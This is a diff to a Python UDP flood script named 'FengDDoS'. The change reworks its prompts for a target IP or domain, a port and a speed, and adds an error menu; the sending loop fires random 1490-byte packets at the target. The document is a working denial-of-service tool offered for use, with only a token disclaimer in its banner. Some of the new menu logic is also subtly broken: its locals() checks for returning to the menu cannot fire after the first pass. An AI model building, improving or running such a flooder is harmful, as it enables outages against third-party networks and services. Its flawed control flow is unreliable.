@@ -4,17 +4,8 @@ import os
 import time
 import socket
 import random
-# Code Time
 from datetime import datetime
-# 新增导入 gethostbyname 用于域名解析
 from socket import gethostbyname 
-
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -22,7 +13,7 @@ bytes = random._urandom(1490)
 #############
 
 def show_banner():
-    """将启动界面封装成函数，方便返回界面时重新打印"""
+    """将启动界面封装成函数"""
     os.system("clear")
     os.system("figlet FengDDoS")
     print (" ")
@@ -31,53 +22,101 @@ def show_banner():
     print (" Github : https://github.com/FengPwner ")
     print (" Atomgit : https://atomgit.com/FengPwner ")
     print (" CSDN : https://blog.csdn.net/2302_76189356 ")
-    print (" Version : 0.3.3 (Modified) ")
+    print (" Version : 0.3.5 (Modified) ")
     print ("---------------------------------------------------")
     print (" To update, please use `git pull` ")
     print ("---------------------------------------------------")
     print (" ")
-    print (" ")
     print (" -----------------[Do not use for illegal purposes]----------------- ")
     print (" ")
-    print (" ")
-    print (" ")
-    print (" ")
+
+def handle_error():
+    """统一的错误交互处理：返回主界面(y)、退出(n)或修改(e)"""
+    while True:
+        choice = input("[?] Return to menu (y), Exit (n), or Edit (e): ").strip().lower()
+        if choice == 'y':
+            return 'y'
+        elif choice == 'n':
+            print("[*] Exiting script. Goodbye!")
+            sys.exit(0)
+        elif choice == 'e':
+            return 'e'
+        else:
+            print("[-] Invalid input. Please enter 'y', 'n', or 'e'.")
 
 # 主循环：用于支持“返回界面”功能
 while True:
     show_banner()
 
-    # --- 目标 IP/域名 解析 ---
-    target = input("IP or Domain: ")
-    try:
-        ip = gethostbyname(target)
-        print(f"[+] Resolved target to IP: {ip}")
-    except socket.gaierror:
-        print("[-] Error: Could not resolve the specified IP or Domain.")
-        input("Press Enter to return to main menu...") # 暂停让用户看到错误
-        continue # 返回主界面
+    # --- 1. 目标 IP/域名 解析 ---
+    while True:
+        target = input("IP or Domain (type 'exit' to quit): ")
+        if target.strip().lower() == 'exit':
+            print("[*] Exiting script. Goodbye!")
+            sys.exit(0)
+        try:
+            ip = gethostbyname(target)
+            print(f"[+] Resolved target to IP: {ip}")
+            break  # 解析成功，跳出当前循环
+        except socket.gaierror:
+            print("[-] Error: Could not resolve the specified IP or Domain.")
+            action = handle_error()
+            if action == 'y': 
+                break  # 跳出IP输入循环，回到主菜单
+            elif action == 'e': 
+                continue  # 重新输入IP
 
-    # --- 端口输入与校验 ---
-    try:
-        port = int(input("port (1-65535): "))
-        if not (1 <= port <= 65535):
-            raise ValueError("Port out of range")
-    except ValueError:
-        print("[-] Error: Invalid port. Please enter a number between 1 and 65535.")
-        input("Press Enter to return to main menu...")
-        continue
+    # 如果用户选择了返回主菜单，跳过后续步骤
+    if 'ip' not in locals() or target.strip().lower() == 'exit': 
+        continue 
 
-    # --- 速度输入与校验 ---
-    try:
-        sd = int(input("speed (1~1000): "))
-        if not (1 <= sd <= 1000):
-            raise ValueError("Speed out of range")
-    except ValueError:
-        print("[-] Error: Invalid speed. Please enter a number between 1 and 1000.")
-        input("Press Enter to return to main menu...")
-        continue
+    # --- 2. 端口输入与校验 ---
+    while True:
+        port_input = input("port (1-65535, type 'exit' to quit): ")
+        if port_input.strip().lower() == 'exit':
+            print("[*] Exiting script. Goodbye!")
+            sys.exit(0)
+        try:
+            port = int(port_input)
+            if not (1 <= port <= 65535):
+                raise ValueError("Port out of range")
+            break  # 校验成功，跳出当前循环
+        except ValueError:
+            print("[-] Error: Invalid port. Please enter a number between 1 and 65535.")
+            action = handle_error()
+            if action == 'y': 
+                break  # 跳出端口输入循环，回到主菜单
+            elif action == 'e': 
+                continue  # 重新输入端口
 
-    # 开始发包
+    # 检查是否选择了返回主菜单
+    if 'port' not in locals(): 
+        continue 
+
+    # --- 3. 速度输入与校验 ---
+    while True:
+        sd_input = input("speed (1~1000, type 'exit' to quit): ")
+        if sd_input.strip().lower() == 'exit':
+            print("[*] Exiting script. Goodbye!")
+            sys.exit(0)
+        try:
+            sd = int(sd_input)
+            if not (1 <= sd <= 1000):
+                raise ValueError("Speed out of range")
+            break  # 校验成功，跳出当前循环
+        except ValueError:
+            print("[-] Error: Invalid speed. Please enter a number between 1 and 1000.")
+            action = handle_error()
+            if action == 'y': 
+                break  # 跳出速度输入循环，回到主菜单
+            elif action == 'e': 
+                continue  # 重新输入速度
+
+    # 检查是否选择了返回主菜单
+    if 'sd' not in locals(): 
+        continue 
+
+    # --- 4. 开始发包 ---
     os.system("clear")
     sent = 0
     print("[*] Attack started... Press Ctrl+C to stop.")
@@ -89,15 +128,8 @@ while True:
             time.sleep((1000 - sd) / 2000)
 
     except KeyboardInterrupt:
-        # 捕获 Ctrl+C 信号
         print("\n\n[!] Attack interrupted by user.")
-        choice = input("[?] Return to main menu? (y/n): ").strip().lower()
-        if choice == 'y':
-            continue  # 返回主循环，重新显示界面
-        elif choice == 'n':
-            print("[*] Exiting script. Goodbye!")
-            sys.exit(0) # 退出脚本
-        else:
-            # 如果用户输入了其他字符，默认也退出，防止死循环
-            print("[*] Invalid input. Exiting script. Goodbye!")
-            sys.exit(0)
+        action = handle_error()
+        if action == 'y': 
+            continue  # 回到主菜单
+        # 如果选择 n，handle_error 内部已经退出；如果选择 e，重新发包（继续当前循环）
